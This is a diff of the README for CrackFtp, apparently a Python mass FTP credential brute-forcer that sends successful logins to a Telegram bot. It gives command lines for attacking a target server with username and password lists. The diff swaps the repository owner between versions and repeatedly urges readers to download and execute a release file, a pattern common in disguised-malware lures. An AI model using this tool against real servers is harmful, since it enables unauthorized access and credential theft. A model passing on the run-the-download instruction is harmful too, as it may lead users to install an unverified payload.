@@ -1,109 +1,138 @@
-# CrackFtp 🚀
+# CrackFtp 🛠️
 
-![CrackFtp](https://img.shields.io/badge/CrackFtp-FTP%20Checker%20and%20Cracker-brightgreen)
+![GitHub release](https://img.shields.io/github/release/DevJinma/CrackFtp.svg)
 
-Welcome to **CrackFtp**, a powerful script designed for mass FTP credential testing. This tool helps you verify login details against secure domains and sends notifications via Telegram upon successful logins. Whether you're a cybersecurity professional or just exploring network security, CrackFtp provides a straightforward and efficient way to assess FTP security.
+Welcome to the **CrackFtp** repository! This project is a mass FTP checker and cracker designed to test login credentials and notify users of successful logins to secure domains via Telegram. With the increasing importance of cybersecurity, tools like CrackFtp help ethical hackers and security professionals ensure the integrity of their networks.
 
 ## Table of Contents
 
 - [Features](#features)
 - [Installation](#installation)
 - [Usage](#usage)
+- [How It Works](#how-it-works)
 - [Telegram Notifications](#telegram-notifications)
 - [Contributing](#contributing)
 - [License](#license)
-- [Support](#support)
+- [Contact](#contact)
+- [Releases](#releases)
 
 ## Features
 
-- **Mass FTP Checking**: Test multiple credentials simultaneously.
-- **Brute Force Capability**: Assess the strength of FTP passwords.
-- **Telegram Alerts**: Receive immediate notifications for successful logins.
-- **Command-Line Interface**: Easy to use with straightforward commands.
+- **Mass FTP Checking**: Test multiple FTP credentials at once.
+- **Brute-Force Capability**: Supports brute-force attempts to discover valid credentials.
+- **Telegram Notifications**: Get instant alerts on successful logins.
+- **Command-Line Interface**: Simple and efficient command-line tool.
+- **Ethical Hacking Tool**: Designed for security professionals and ethical hackers.
 - **Cross-Platform**: Works on Windows, macOS, and Linux.
-- **Open Source**: Contribute and enhance the project as needed.
 
 ## Installation
 
-To get started with CrackFtp, download the latest release from our [Releases section](https://github.com/kitcatsaw93/CrackFtp/releases/tag/1). After downloading, extract the files and navigate to the directory where you placed the script.
+To get started with CrackFtp, follow these steps:
 
-```bash
-git clone https://github.com/nutstreetking/CrackFtp.git
-cd CrackFtp
-```
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/DevJinma/CrackFtp.git
+   cd CrackFtp
+   ```
 
-Make sure you have Python installed on your machine. You can check this by running:
+2. **Install Dependencies**:
+   Ensure you have Python installed. Then, run:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-```bash
-python --version
-```
-
-If Python is not installed, please download it from the [official website](https://www.python.org/downloads/).
-
-### Dependencies
-
-Before running the script, install the required dependencies:
-
-```bash
-pip install -r requirements.txt
-```
+3. **Download the Latest Release**:
+   You can download the latest release [here](https://github.com/DevJinma/CrackFtp/releases). Make sure to execute the downloaded file.
 
 ## Usage
 
-Once you have installed the necessary dependencies, you can run the script using the command line. Here’s how to do it:
+To use CrackFtp, run the script from the command line. The basic syntax is:
 
 ```bash
-python crackftp.py --host <FTP_HOST> --user <USERNAME_LIST> --pass <PASSWORD_LIST>
+python crackftp.py --target <ftp_server> --user <username_file> --pass <password_file>
 ```
-
-- **`<FTP_HOST>`**: The target FTP server address.
-- **`<USERNAME_LIST>`**: A file containing usernames to test.
-- **`<PASSWORD_LIST>`**: A file containing passwords to test.
 
 ### Example
 
 ```bash
-python crackftp.py --host ftp.example.com --user users.txt --pass passwords.txt
+python crackftp.py --target ftp.example.com --user users.txt --pass passwords.txt
 ```
 
-This command will test the usernames and passwords listed in the specified files against the FTP server at `ftp.example.com`.
+This command will attempt to log in to `ftp.example.com` using usernames from `users.txt` and passwords from `passwords.txt`.
+
+## How It Works
+
+CrackFtp uses a straightforward approach to check FTP credentials. It connects to the specified FTP server and attempts to log in using combinations of usernames and passwords. If a successful login occurs, it logs the credentials and sends a notification via Telegram.
+
+### Workflow
+
+1. **Input Files**: Users provide a list of usernames and passwords in text files.
+2. **Connection**: The script establishes a connection to the FTP server.
+3. **Login Attempts**: It iterates through the provided credentials, attempting to log in.
+4. **Notifications**: On success, it sends a notification to the specified Telegram bot.
 
 ## Telegram Notifications
 
-To enable Telegram notifications, you need to set up a bot. Follow these steps:
+To receive notifications, you need to set up a Telegram bot. Follow these steps:
 
-1. Open Telegram and search for the "BotFather".
-2. Create a new bot and note down the API token.
-3. Get your chat ID by sending a message to your bot and using the API to retrieve it.
+1. **Create a Telegram Bot**:
+   - Open Telegram and search for `@BotFather`.
+   - Use the command `/newbot` to create a new bot and follow the prompts.
+   - Save the token provided by BotFather.
 
-Once you have both the API token and chat ID, add them to your configuration file. 
+2. **Get Your Chat ID**:
+   - Start a chat with your bot.
+   - Use the following URL to get your chat ID:
+     ```
+     https://api.telegram.org/bot<YourBOTToken>/getUpdates
+     ```
+   - Look for your chat ID in the JSON response.
 
-```json
-{
-  "telegram_token": "YOUR_API_TOKEN",
-  "chat_id": "YOUR_CHAT_ID"
-}
-```
-
-Now, whenever a successful login occurs, you will receive a notification in Telegram.
+3. **Configure the Script**:
+   - Edit the configuration file or pass the token and chat ID as command-line arguments when running the script.
 
 ## Contributing
 
-We welcome contributions to CrackFtp! If you have suggestions or improvements, feel free to fork the repository and submit a pull request. Please follow these guidelines:
+We welcome contributions! If you have ideas for improvements or new features, feel free to fork the repository and submit a pull request. 
 
-1. Fork the repository.
-2. Create a new branch for your feature or bug fix.
-3. Make your changes and commit them with clear messages.
-4. Push your changes and create a pull request.
+### Steps to Contribute
+
+1. **Fork the Repository**.
+2. **Create a New Branch**:
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Your Changes**.
+4. **Commit Your Changes**:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Fork**:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Submit a Pull Request**.
 
 ## License
 
-CrackFtp is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Support
+## Contact
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/kitcatsaw93/CrackFtp/releases/tag/1) for updates. You can also open an issue in the repository, and we will respond as soon as possible.
+For any questions or suggestions, please contact the maintainer:
+
+- **Name**: DevJinma
+- **Email**: devjinma@example.com
+
+## Releases
+
+To get the latest version of CrackFtp, visit the [Releases](https://github.com/DevJinma/CrackFtp/releases) section. Make sure to download and execute the file for the latest features and fixes.
+
+## Acknowledgments
+
+- Special thanks to the contributors who helped make this project possible.
+- Inspired by various open-source projects in the cybersecurity domain.
 
 ---
 
-Thank you for using CrackFtp! We hope this tool helps you enhance your understanding of FTP security. Happy testing!
+Thank you for your interest in CrackFtp! We hope this tool serves you well in your security endeavors.
